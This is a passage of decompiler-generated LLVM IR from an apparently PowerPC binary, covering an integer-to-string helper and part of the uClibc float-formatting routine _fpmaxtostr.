  store i32 %v1_10007af0, i32* %r31.global-to-local, align 4
  %v4_10007af4 = icmp eq i32 %v1_10007aec, %v1_10007af0
  br i1 %v4_10007af4, label %dec_label_pc_10007afc, label %dec_label_pc_10007b04

dec_label_pc_10007afc:                            ; preds = %dec_label_pc_10007adc
  %v1_10007afc = add i32 %v0_10007aec, 1
  store i32 %v1_10007afc, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007b04

dec_label_pc_10007b04:                            ; preds = %dec_label_pc_10007adc, %dec_label_pc_10007afc
  %v0_10007b04 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10007b04, i32* %r12.global-to-local, align 4
  br label %dec_label_pc_10007b08

dec_label_pc_10007b08thread-pre-split:            ; preds = %dec_label_pc_10007b5c
  %v0_10007b08.pr = load i32, i32* %r12.global-to-local, align 4
  %v1_10007b0c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10007b08

dec_label_pc_10007b08:                            ; preds = %dec_label_pc_10007b08thread-pre-split, %dec_label_pc_10007b04
  %v1_10007b50 = phi i32 [ %v1_10007b0c.pre, %dec_label_pc_10007b08thread-pre-split ], [ %v1_10007aec, %dec_label_pc_10007b04 ]
  %v1_10007b20 = phi i32 [ %v0_10007b08.pr, %dec_label_pc_10007b08thread-pre-split ], [ %v0_10007b04, %dec_label_pc_10007b04 ]
  %v3_10007b08 = icmp eq i32 %v1_10007b20, 0
  %v0_10007b0c = load i32, i32* %r6.global-to-local, align 4
  %v2_10007b0c = udiv i32 %v0_10007b0c, %v1_10007b50
  br i1 %v3_10007b08, label %dec_label_pc_10007b50, label %dec_label_pc_10007b14

dec_label_pc_10007b14:                            ; preds = %dec_label_pc_10007b08
  %v2_10007b14 = udiv i32 %v1_10007b20, %v1_10007b50
  %v2_10007b18 = mul i32 %v2_10007b14, %v1_10007b50
  %v2_10007b1c = mul i32 %v2_10007b0c, %v1_10007b50
  %v2_10007b20 = sub i32 %v1_10007b20, %v2_10007b18
  store i32 %v2_10007b14, i32* %r12.global-to-local, align 4
  %v0_10007b28 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007b28 = mul i32 %v0_10007b28, %v2_10007b20
  %v2_10007b2c = sub i32 %v0_10007b0c, %v2_10007b1c
  %v2_10007b30 = add i32 %v2_10007b28, %v2_10007b2c
  %v0_10007b34 = load i32, i32* %r8.global-to-local, align 4
  %v2_10007b34 = mul i32 %v0_10007b34, %v2_10007b20
  %v2_10007b38 = udiv i32 %v2_10007b30, %v1_10007b50
  %v2_10007b3c = add i32 %v2_10007b34, %v2_10007b0c
  %v2_10007b40 = mul i32 %v2_10007b38, %v1_10007b50
  %v2_10007b44 = add i32 %v2_10007b3c, %v2_10007b38
  store i32 %v2_10007b44, i32* %r6.global-to-local, align 4
  %v2_10007b48 = sub i32 %v2_10007b30, %v2_10007b40
  store i32 %v2_10007b48, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10007b5c

dec_label_pc_10007b50:                            ; preds = %dec_label_pc_10007b08
  %v2_10007b50 = mul i32 %v2_10007b0c, %v1_10007b50
  %v2_10007b54 = sub i32 %v0_10007b0c, %v2_10007b50
  store i32 %v2_10007b54, i32* %r5.global-to-local, align 4
  store i32 %v2_10007b0c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10007b5c

dec_label_pc_10007b5c:                            ; preds = %dec_label_pc_10007b14, %dec_label_pc_10007b50
  %v1_10007b60 = phi i32 [ %v2_10007b14, %dec_label_pc_10007b14 ], [ 0, %dec_label_pc_10007b50 ]
  %v0_10007b60 = phi i32 [ %v2_10007b44, %dec_label_pc_10007b14 ], [ %v2_10007b0c, %dec_label_pc_10007b50 ]
  %v0_10007b64 = phi i32 [ %v2_10007b48, %dec_label_pc_10007b14 ], [ %v2_10007b54, %dec_label_pc_10007b50 ]
  %v2_10007b60 = or i32 %v0_10007b60, %v1_10007b60
  %v5_10007b60 = icmp eq i32 %v2_10007b60, 0
  store i1 %v5_10007b60, i1* %cr0_eq.global-to-local, align 1
  %v1_10007b68 = load i32, i32* %r30.global-to-local, align 4
  %v0_10007b6c = load i32, i32* %r3.global-to-local, align 4
  %v1_10007b6c = add i32 %v0_10007b6c, -1
  store i32 %v1_10007b6c, i32* %r3.global-to-local, align 4
  %tmp14 = icmp ult i32 %v0_10007b64, 10
  %v1_10007b64.v2_10007b68.v = select i1 %tmp14, i32 48, i32 %v1_10007b68
  %v1_10007b64.v2_10007b68 = add i32 %v0_10007b64, %v1_10007b64.v2_10007b68.v
  %extract.t9.extract.t = trunc i32 %v1_10007b64.v2_10007b68 to i8
  %v3_10007b7c = inttoptr i32 %v1_10007b6c to i8*
  store i8 %extract.t9.extract.t, i8* %v3_10007b7c, align 1
  %v0_10007b80 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10007b80, label %dec_label_pc_10007b84, label %dec_label_pc_10007b08thread-pre-split

dec_label_pc_10007b84:                            ; preds = %dec_label_pc_10007b5c
  %v0_10007b84 = load i32, i32* @r29, align 4
  %v3_10007b84 = icmp eq i32 %v0_10007b84, 0
  br i1 %v3_10007b84, label %dec_label_pc_10007b84.dec_label_pc_10007b94_crit_edge, label %dec_label_pc_10007b8c

dec_label_pc_10007b84.dec_label_pc_10007b94_crit_edge: ; preds = %dec_label_pc_10007b84
  %v0_10007b9c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007b94

dec_label_pc_10007b8c:                            ; preds = %dec_label_pc_10007b84
  %v2_10007b90 = load i32, i32* %r3.global-to-local, align 4
  %v3_10007b90 = add i32 %v2_10007b90, -1
  %v4_10007b90 = inttoptr i32 %v3_10007b90 to i8*
  store i8 45, i8* %v4_10007b90, align 1
  store i32 %v3_10007b90, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007b94

dec_label_pc_10007b94:                            ; preds = %dec_label_pc_10007b84.dec_label_pc_10007b94_crit_edge, %dec_label_pc_10007b8c
  %v0_10007b9c = phi i32 [ %v0_10007b9c.pre, %dec_label_pc_10007b84.dec_label_pc_10007b94_crit_edge ], [ %v3_10007b90, %dec_label_pc_10007b8c ]
  ret i32 %v0_10007b9c

; uselistorder directives
  uselistorder i32 %v2_10007b14, { 1, 2, 0 }
  uselistorder i32 %v2_10007b0c, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v1_10007b50, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 %v1_10007aec, { 1, 2, 0 }
  uselistorder i32 %v0_10007aec, { 1, 0 }
  uselistorder i32 %v0_10007aa8, { 1, 2, 0, 3 }
  uselistorder i32* %r8.global-to-local, { 2, 1, 3, 4, 0 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 4, 3, 6, 5, 0, 1 }
  uselistorder i8 45, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10007b94, { 1, 0 }
  uselistorder label %dec_label_pc_10007b5c, { 1, 0 }
  uselistorder label %dec_label_pc_10007b04, { 1, 0 }
  uselistorder label %dec_label_pc_10007adc, { 2, 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr6_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-200 = alloca i8, align 1
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-179 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-177 = alloca i32, align 4
  %stack_var_-159 = alloca i32, align 4
  %stack_var_-178 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_10007ba0 = load i32, i32* @lr, align 4
  store i32 %v0_10007ba0, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  store i32 %arg3, i32* @r26, align 4
  %v1_10007bbc = add i32 %tmp, 11
  %v2_10007bbc = inttoptr i32 %v1_10007bbc to i8*
  %v3_10007bbc = load i8, i8* %v2_10007bbc, align 1
  %v4_10007bbc = zext i8 %v3_10007bbc to i32
  store i32 %v4_10007bbc, i32* %r31.global-to-local, align 4
  %v1_10007bc0 = or i32 %v4_10007bbc, 32
  %v1_10007bc4 = icmp ult i32 %v1_10007bc0, 97
  %v3_10007bc4 = icmp eq i32 %v1_10007bc0, 97
  store i1 %v1_10007bc4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007bc4, i1* %cr7_eq.global-to-local, align 1
  store i32 101, i32* %r0.global-to-local, align 4
  %v1_10007bd0 = add i32 %tmp, 4
  %v2_10007bd0 = inttoptr i32 %v1_10007bd0 to i32*
  %v3_10007bd0 = load i32, i32* %v2_10007bd0, align 4
  store i32 %v3_10007bd0, i32* %r28.global-to-local, align 4
  %v2_10007bd4 = load i32, i32* %arg2, align 4
  store i32 %v2_10007bd4, i32* %r30.global-to-local, align 4
  br i1 %v3_10007bc4, label %dec_label_pc_10007bdc, label %dec_label_pc_10007be4

dec_label_pc_10007bdc:                            ; preds = %entry
  %v1_10007bdc = add nuw nsw i32 %v4_10007bbc, 6
  store i32 %v1_10007bdc, i32* %r0.global-to-local, align 4
  %v1_10007be0 = urem i32 %v1_10007bdc, 256
  store i32 %v1_10007be0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007be4

dec_label_pc_10007be4:                            ; preds = %entry, %dec_label_pc_10007bdc
  %v0_10007c98 = phi i32 [ %v4_10007bbc, %entry ], [ %v1_10007be0, %dec_label_pc_10007bdc ]
  %v1_10007be4 = icmp slt i32 %v2_10007bd4, 0
  %v3_10007be4 = icmp eq i32 %v2_10007bd4, 0
  store i1 %v1_10007be4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007be4, i1* %cr7_eq.global-to-local, align 1
  %tmp75 = icmp sgt i32 %v2_10007bd4, -1
  br i1 %tmp75, label %dec_label_pc_10007bf0, label %dec_label_pc_10007bec

dec_label_pc_10007bec:                            ; preds = %dec_label_pc_10007be4
  store i32 6, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10007bf0

dec_label_pc_10007bf0:                            ; preds = %dec_label_pc_10007be4, %dec_label_pc_10007bec
  %v0_10007da844 = phi i32 [ %v2_10007bd4, %dec_label_pc_10007be4 ], [ 6, %dec_label_pc_10007bec ]
  %v1_10007bf0 = add i32 %tmp, 12
  %v2_10007bf0 = inttoptr i32 %v1_10007bf0 to i32*
  %v3_10007bf0 = load i32, i32* %v2_10007bf0, align 4
  store i32 %v3_10007bf0, i32* %r9.global-to-local, align 4
  %v1_10007bf4 = and i32 %v3_10007bf0, 2
  %v3_10007bf4 = icmp eq i32 %v1_10007bf4, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %stack_var_-200, align 1
  br i1 %v3_10007bf4, label %dec_label_pc_10007c0c, label %dec_label_pc_10007c18

dec_label_pc_10007c0c:                            ; preds = %dec_label_pc_10007bf0
  %v1_10007c0c = urem i32 %v3_10007bf0, 2
  store i32 %v1_10007c0c, i32* @r7, align 4
  %v3_10007c0c = icmp eq i32 %v1_10007c0c, 0
  br i1 %v3_10007c0c, label %dec_label_pc_10007c1c, label %dec_label_pc_10007c18

dec_label_pc_10007c18:                            ; preds = %dec_label_pc_10007c0c, %dec_label_pc_10007bf0
  %storemerge = phi i32 [ 43, %dec_label_pc_10007bf0 ], [ 32, %dec_label_pc_10007c0c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v6_10007c18 = trunc i32 %storemerge to i8
  store i8 %v6_10007c18, i8* %stack_var_-200, align 1
  br label %dec_label_pc_10007c1c

dec_label_pc_10007c1c:                            ; preds = %dec_label_pc_10007c0c, %dec_label_pc_10007c18
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_10007be4, label %dec_label_pc_10007d80, label %dec_label_pc_10007c98

dec_label_pc_10007c98:                            ; preds = %dec_label_pc_10007c1c
  %v1_10007c98 = icmp ult i32 %v0_10007c98, 96
  %v2_10007c98 = icmp ugt i32 %v0_10007c98, 96
  %v3_10007c98 = icmp eq i32 %v0_10007c98, 96
  store i1 %v1_10007c98, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007c98, i1* %cr7_eq.global-to-local, align 1
  %v2_10007ca0 = add i32 %tmp, 16
  %v3_10007ca0 = inttoptr i32 %v2_10007ca0 to i32*
  store i32 32, i32* %v3_10007ca0, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  store i32 3, i32* %stack_var_-140, align 4
  br i1 %v2_10007c98, label %dec_label_pc_10007cc4, label %dec_label_pc_10007cb8

dec_label_pc_10007cb8:                            ; preds = %dec_label_pc_10007c98
  store i32 12, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10007cc4

dec_label_pc_10007cc4:                            ; preds = %dec_label_pc_10007c98, %dec_label_pc_10007cb8
  %stack_var_-136.1 = phi i32 [ add (i32 ptrtoint ([4 x i8]* @global_var_1000cf40.429 to i32), i32 8), %dec_label_pc_10007c98 ], [ add (i32 ptrtoint ([4 x i8]* @global_var_1000cf40.429 to i32), i32 12), %dec_label_pc_10007cb8 ]
  store i32 ptrtoint ([4 x i8]* @global_var_1000cf40.429 to i32), i32* %r9.global-to-local, align 4
  %v2_10007cd0 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_10007cd0, i32* %r8.global-to-local, align 4
  store i32 %stack_var_-136.1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10008170

dec_label_pc_10007d80:                            ; preds = %dec_label_pc_10007c1c
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10007d84 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_10007d84, i32* %r6.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 1127219200, i32* %r3.global-to-local, align 4
  %v1_10007dd0 = xor i32 %tmp54, -2147483648
  br label %dec_label_pc_10007da4

dec_label_pc_10007da4:                            ; preds = %dec_label_pc_10007e24.dec_label_pc_10007da4_crit_edge, %dec_label_pc_10007d80
  %v0_10007da8 = phi i32 [ %v0_10007da8.pre, %dec_label_pc_10007e24.dec_label_pc_10007da4_crit_edge ], [ %v0_10007da844, %dec_label_pc_10007d80 ]
  %v3_10007da8 = call %1 @__asm_cror(i32 %v0_10007da8, i32 %tmp, i32 %v0_10007da8)
  %v11_10007da8 = extractvalue %1 %v3_10007da8, 7
  store i4 %v11_10007da8, i4* @cr4, align 1
  %v0_10007dac = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10007dac, label %dec_label_pc_10007dc0, label %dec_label_pc_10007dd4

dec_label_pc_10007dc0:                            ; preds = %dec_label_pc_10007da4
  store i32 %tmp54, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10007dd4

dec_label_pc_10007dd4:                            ; preds = %dec_label_pc_10007da4, %dec_label_pc_10007dc0
  %storemerge2 = phi i32 [ %v1_10007dd0, %dec_label_pc_10007dc0 ], [ %tmp55, %dec_label_pc_10007da4 ]
  store i32 %storemerge2, i32* %r10.global-to-local, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v0_10007de4 = load i32, i32* %r6.global-to-local, align 4
  %v1_10007de4 = add i32 %v0_10007de4, 9
  store i32 %v1_10007de4, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10007e00

dec_label_pc_10007e00:                            ; preds = %dec_label_pc_10007e00.dec_label_pc_10007e00_crit_edge, %dec_label_pc_10007dd4
  %v1_10007e08 = phi i32 [ %v1_10007e08.pre, %dec_label_pc_10007e00.dec_label_pc_10007e00_crit_edge ], [ %v1_10007de4, %dec_label_pc_10007dd4 ]
  %v0_10007e04 = phi i32 [ %v0_10007e04.pre, %dec_label_pc_10007e00.dec_label_pc_10007e00_crit_edge ], [ 0, %dec_label_pc_10007dd4 ]
  %v1_10007e00 = phi i32 [ %v1_10007e00.pre, %dec_label_pc_10007e00.dec_label_pc_10007e00_crit_edge ], [ 10, %dec_label_pc_10007dd4 ]
  %v1_10007e10 = phi i32 [ %v0_10007e00.pre, %dec_label_pc_10007e00.dec_label_pc_10007e00_crit_edge ], [ %storemerge2, %dec_label_pc_10007dd4 ]
  %v2_10007e00 = udiv i32 %v1_10007e10, %v1_10007e00
  store i32 %v2_10007e00, i32* %r0.global-to-local, align 4
  %v1_10007e04 = add i32 %v0_10007e04, 1
  store i32 %v1_10007e04, i32* %r8.global-to-local, align 4
  %v2_10007e08 = sub i32 %v1_10007e08, %v1_10007e04
  store i32 %v2_10007e08, i32* %r11.global-to-local, align 4
  %tmp76 = mul i32 %v2_10007e00, -10
  store i32 %v2_10007e00, i32* %r10.global-to-local, align 4
  %v2_10007e10 = add i32 %v1_10007e10, 48
  %v1_10007e18 = add i32 %v2_10007e10, %tmp76
  store i32 %v1_10007e18, i32* %r9.global-to-local, align 4
  %v1_10007e1c = trunc i32 %v1_10007e18 to i8
  %v3_10007e1c = inttoptr i32 %v2_10007e08 to i8*
  store i8 %v1_10007e1c, i8* %v3_10007e1c, align 1
  %v0_10007e20 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007e20 = add i32 %v0_10007e20, -1
  store i32 %v1_10007e20, i32* %ctr.global-to-local, align 4
  %v2_10007e20 = icmp eq i32 %v1_10007e20, 0
  br i1 %v2_10007e20, label %dec_label_pc_10007e24, label %dec_label_pc_10007e00.dec_label_pc_10007e00_crit_edge

dec_label_pc_10007e00.dec_label_pc_10007e00_crit_edge: ; preds = %dec_label_pc_10007e00
  %v0_10007e00.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_10007e00.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_10007e04.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_10007e08.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10007e00

dec_label_pc_10007e24:                            ; preds = %dec_label_pc_10007e00
  %v0_10007e24 = load i32, i32* %r7.global-to-local, align 4
  %v1_10007e24 = icmp slt i32 %v0_10007e24, 0
  %v3_10007e24 = icmp eq i32 %v0_10007e24, 0
  store i1 %v1_10007e24, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007e24, i1* %cr7_eq.global-to-local, align 1
  %v1_10007e28 = add i32 %v0_10007e24, 1
  store i32 %v1_10007e28, i32* %r7.global-to-local, align 4
  br i1 %v3_10007e24, label %dec_label_pc_10007e24.dec_label_pc_10007da4_crit_edge, label %dec_label_pc_10007e30

dec_label_pc_10007e24.dec_label_pc_10007da4_crit_edge: ; preds = %dec_label_pc_10007e24
  %v0_10007da8.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10007da4

dec_label_pc_10007e30:                            ; preds = %dec_label_pc_10007e24
  %v0_10007e30 = load i32, i32* %r31.global-to-local, align 4
  %v1_10007e30 = icmp ult i32 %v0_10007e30, 96
  %v2_10007e30 = icmp ugt i32 %v0_10007e30, 96
  %v3_10007e30 = icmp eq i32 %v0_10007e30, 96
  store i1 %v1_10007e30, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007e30, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10007e30, label %dec_label_pc_10007e48, label %dec_label_pc_10007e38

dec_label_pc_10007e38:                            ; preds = %dec_label_pc_10007e30
  %v1_10007e40 = add i32 %v0_10007e30, 32
  store i32 %v1_10007e40, i32* %r0.global-to-local, align 4
  %v1_10007e44 = urem i32 %v1_10007e40, 256
  store i32 %v1_10007e44, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007e48

dec_label_pc_10007e48:                            ; preds = %dec_label_pc_10007e30, %dec_label_pc_10007e38
  %v0_10007e60 = phi i32 [ %v1_10007e44, %dec_label_pc_10007e38 ], [ %v0_10007e30, %dec_label_pc_10007e30 ]
  %stack_var_-194.0 = phi i32 [ 69, %dec_label_pc_10007e38 ], [ 101, %dec_label_pc_10007e30 ]
  %v1_10007e48 = icmp slt i32 %v0_10007e60, 103
  %v3_10007e48 = icmp eq i32 %v0_10007e60, 103
  store i1 %v1_10007e48, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007e48, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007e48, label %dec_label_pc_10007e50, label %dec_label_pc_10007e60

dec_label_pc_10007e50:                            ; preds = %dec_label_pc_10007e48
  %v0_10007e50 = load i32, i32* %r30.global-to-local, align 4
  %v1_10007e50 = icmp slt i32 %v0_10007e50, 0
  %v3_10007e50 = icmp eq i32 %v0_10007e50, 0
  store i1 %v1_10007e50, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007e50, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007e50, label %dec_label_pc_10007e68, label %dec_label_pc_10007e58

dec_label_pc_10007e58:                            ; preds = %dec_label_pc_10007e50
  %v1_10007e58 = add i32 %v0_10007e50, -1
  store i32 %v1_10007e58, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10007e68

dec_label_pc_10007e60:                            ; preds = %dec_label_pc_10007e48
  %v1_10007e60 = icmp slt i32 %v0_10007e60, 102
  %v3_10007e60 = icmp eq i32 %v0_10007e60, 102
  store i1 %v1_10007e60, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007e60, i1* %cr7_eq.global-to-local, align 1
  %v0_10007e70 = load i32, i32* %r30.global-to-local, align 4
  br i1 %v3_10007e60, label %dec_label_pc_10007e70, label %dec_label_pc_10007e68

dec_label_pc_10007e68:                            ; preds = %dec_label_pc_10007e60, %dec_label_pc_10007e50, %dec_label_pc_10007e58
  %v0_10007e68 = phi i32 [ 0, %dec_label_pc_10007e50 ], [ %v1_10007e58, %dec_label_pc_10007e58 ], [ %v0_10007e70, %dec_label_pc_10007e60 ]
  store i32 %v0_10007e68, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10007e94

dec_label_pc_10007e70:                            ; preds = %dec_label_pc_10007e60
  %v1_10007e70 = load i32, i32* %r4.global-to-local, align 4
  %v2_10007e70 = add i32 %v1_10007e70, %v0_10007e70
  store i32 %v2_10007e70, i32* %r10.global-to-local, align 4
  %v1_10007e74 = icmp slt i32 %v2_10007e70, -1
  %v3_10007e74 = icmp eq i32 %v2_10007e70, -1
  store i1 %v1_10007e74, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007e74, i1* %cr7_eq.global-to-local, align 1
  %tmp77 = icmp sgt i32 %v2_10007e70, -2
  br i1 %tmp77, label %dec_label_pc_10007e94, label %dec_label_pc_10007e7c

dec_label_pc_10007e7c:                            ; preds = %dec_label_pc_10007e70
  store i32 48, i32* %r4.global-to-local, align 4
  %v2_10007e80 = ptrtoint i32* %stack_var_-178 to i32
  store i32 %v2_10007e80, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r5.global-to-local, align 4
  store i32 268467852, i32* @lr, align 4
  %v3_10007e88 = call i32 @__GI_memset(i32 %v2_10007e80, i32 48, i32 17)
  store i32 %v3_10007e88, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10007e94

dec_label_pc_10007e94:                            ; preds = %dec_label_pc_10007e70, %dec_label_pc_10007e68, %dec_label_pc_10007e7c
  %v1_10007eb8 = phi i32 [ %v2_10007e70, %dec_label_pc_10007e70 ], [ %v0_10007e68, %dec_label_pc_10007e68 ], [ -1, %dec_label_pc_10007e7c ]
  %v1_10007e94 = icmp slt i32 %v1_10007eb8, 16
  %v2_10007e94 = icmp sgt i32 %v1_10007eb8, 16
  %v3_10007e94 = icmp eq i32 %v1_10007eb8, 16
  store i1 %v1_10007e94, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007e94, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %stack_var_-178, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  store i32 48, i32* %stack_var_-177, align 4
  %v2_10007ea8 = ptrtoint i32* %stack_var_-159 to i32
  store i32 %v2_10007ea8, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v2_10007e94, label %dec_label_pc_10007ed0, label %dec_label_pc_10007eb4

dec_label_pc_10007eb4:                            ; preds = %dec_label_pc_10007e94
  %v2_10007eb4 = ptrtoint i32* %stack_var_-177 to i32
  %v2_10007eb8 = add i32 %v1_10007eb8, %v2_10007eb4
  store i32 %v2_10007eb8, i32* %r9.global-to-local, align 4
  %v1_10007ebc = add i32 %v2_10007eb8, 2
  %v2_10007ebc = inttoptr i32 %v1_10007ebc to i8*
  %v3_10007ebc = load i8, i8* %v2_10007ebc, align 1
  %v4_10007ebc = zext i8 %v3_10007ebc to i32
  store i32 %v4_10007ebc, i32* %r0.global-to-local, align 4
  store i32 %v1_10007ebc, i32* %r11.global-to-local, align 4
  %v1_10007ec4 = sub nsw i32 52, %v4_10007ebc
  %v2_10007ec4 = sub nuw nsw i32 -1, %v4_10007ebc
  %not.v5_10007ec4 = icmp ugt i32 %v1_10007ec4, %v2_10007ec4
  %v1_10007ecc = zext i1 %not.v5_10007ec4 to i32
  store i32 %v1_10007ecc, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10007ed0

dec_label_pc_10007ed0:                            ; preds = %dec_label_pc_10007e94, %dec_label_pc_10007eb4, %dec_label_pc_10007ed0.backedge
  %v0_10007ed4 = phi i32 [ %v0_10007ed4.pre, %dec_label_pc_10007ed0.backedge ], [ 0, %dec_label_pc_10007e94 ], [ %v1_10007ecc, %dec_label_pc_10007eb4 ]
  %v0_10007ed0 = phi i32 [ %v0_10007ed0.pre, %dec_label_pc_10007ed0.backedge ], [ %v2_10007ea8, %dec_label_pc_10007e94 ], [ %v1_10007ebc, %dec_label_pc_10007eb4 ]
  %v1_10007ed0 = add i32 %v0_10007ed0, -1
  %v2_10007ed0 = inttoptr i32 %v1_10007ed0 to i8*
  %v3_10007ed0 = load i8, i8* %v2_10007ed0, align 1
  %v4_10007ed0 = zext i8 %v3_10007ed0 to i32
  store i32 %v1_10007ed0, i32* %r11.global-to-local, align 4
  %v2_10007ed4 = add i32 %v4_10007ed0, %v0_10007ed4
  store i32 %v2_10007ed4, i32* %r0.global-to-local, align 4
  %v1_10007ed8 = urem i32 %v2_10007ed4, 256
  store i32 %v1_10007ed8, i32* %r9.global-to-local, align 4
  %v1_10007edc = trunc i32 %v2_10007ed4 to i8
  store i8 %v1_10007edc, i8* %v2_10007ed0, align 1
  %v0_10007ee0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10007ee0 = icmp slt i32 %v0_10007ee0, 48
  %v3_10007ee0 = icmp eq i32 %v0_10007ee0, 48
  store i1 %v1_10007ee0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007ee0, i1* %cr7_eq.global-to-local, align 1
  %v1_10007ee4 = icmp ult i32 %v0_10007ee0, 57
  %v2_10007ee4 = icmp ugt i32 %v0_10007ee0, 57
  %v3_10007ee4 = icmp eq i32 %v0_10007ee0, 57
  store i1 %v1_10007ee4, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10007ee4, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10007ee4, i1* %cr6_eq.global-to-local, align 1
  %brmerge = or i1 %v3_10007ee0, %v2_10007ee4
  br i1 %brmerge, label %dec_label_pc_10007ed0.backedge, label %dec_label_pc_10007ef0

dec_label_pc_10007ed0.backedge:                   ; preds = %dec_label_pc_10007ed0
  %v0_10007ed0.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_10007ed4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10007ed0

dec_label_pc_10007ef0:                            ; preds = %dec_label_pc_10007ed0
  %v2_10007ef0 = ptrtoint i32* %stack_var_-177 to i32
  store i32 %v2_10007ef0, i32* %r0.global-to-local, align 4
  %v0_10007ef4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10007ef4, i32* @r7, align 4
  %v0_10007ef8 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007ef8 = icmp ult i32 %v0_10007ef8, %v2_10007ef0
  %v3_10007ef8 = icmp ugt i32 %v0_10007ef8, %v2_10007ef0
